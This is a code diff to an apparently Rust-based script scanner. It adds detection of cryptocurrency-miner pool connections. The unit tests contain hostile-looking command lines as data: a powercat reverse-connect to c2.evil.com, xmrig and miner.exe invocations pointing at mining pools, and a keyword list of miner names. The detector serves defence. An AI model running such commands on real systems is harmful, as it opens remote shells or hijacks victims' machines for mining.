@@ -4486,6 +4486,23 @@ static POWERCAT_PORT_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static MINER_POOL_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?ix)
+            (?: --server | --url | --pool | -o )
+            \s+
+            ['"]?
+            (?: stratum (?: \+ [a-z0-9]+ )? :// )?
+            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
+            :
+            (\d{1,5})
+            ['"]?
+        "#,
+    )
+    .expect("miner pool regex")
+});
+
+#[allow(clippy::expect_used)]
 static DECIMAL_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
     // PowerShell accepts a 32-bit integer in place of an IPv4 host:
     //   Invoke-WebRequest 1297338337/x.jpg  ->  http://77.83.42.33/x.jpg
@@ -4672,6 +4689,33 @@ fn scan_remote_connects(deobfuscated: &str, env: &mut Environment) {
                 host,
                 port,
             });
+        }
+        let trimmed = line.trim_start();
+        let lower = trimmed.to_ascii_lowercase();
+        let has_miner_context = lower.contains("xmrig")
+            || lower.contains("miner.exe")
+            || lower.contains("stratum")
+            || lower.contains("etchash")
+            || lower.contains("kawpow")
+            || lower.contains("randomx")
+            || lower.contains("cryptonight");
+        if has_miner_context && !lower.starts_with("::") && !lower.starts_with("rem ") {
+            for caps in MINER_POOL_RE.captures_iter(trimmed) {
+                let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
+                    continue;
+                };
+                let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
+                    continue;
+                };
+                if !seen.insert((host.clone(), port)) {
+                    continue;
+                }
+                env.traits.push(Trait::RemoteConnect {
+                    cmd: line.to_string(),
+                    host,
+                    port,
+                });
+            }
         }
     }
 }
@@ -5256,6 +5300,30 @@ mod ps_tcp_client_tests {
     fn powercat_reverse_connect_port_ip_flags() {
         let s = r#"powercat -p 2080 -c c2.evil.com -ep"#;
         assert_eq!(connects(s), vec![("c2.evil.com".to_string(), 2080)]);
+    }
+
+    #[test]
+    fn miner_stratum_server_flag_emits_remote_connect() {
+        let s = r#"miner.exe --proto stratum --algo etchash --server etchash.infinityton.com:4445 --user wallet.worker"#;
+        assert_eq!(
+            connects(s),
+            vec![("etchash.infinityton.com".to_string(), 4445)]
+        );
+    }
+
+    #[test]
+    fn xmrig_pool_output_flag_emits_remote_connect() {
+        let s = r#"xmrig.exe -a gr -o raptoreumemporium.com:3008 -u wallet -p x"#;
+        assert_eq!(
+            connects(s),
+            vec![("raptoreumemporium.com".to_string(), 3008)]
+        );
+    }
+
+    #[test]
+    fn commented_miner_pool_example_does_not_emit_remote_connect() {
+        let s = r#":: xmrig.exe -a gr -o example.com:3333 -u wallet"#;
+        assert!(connects(s).is_empty());
     }
 
     #[test]
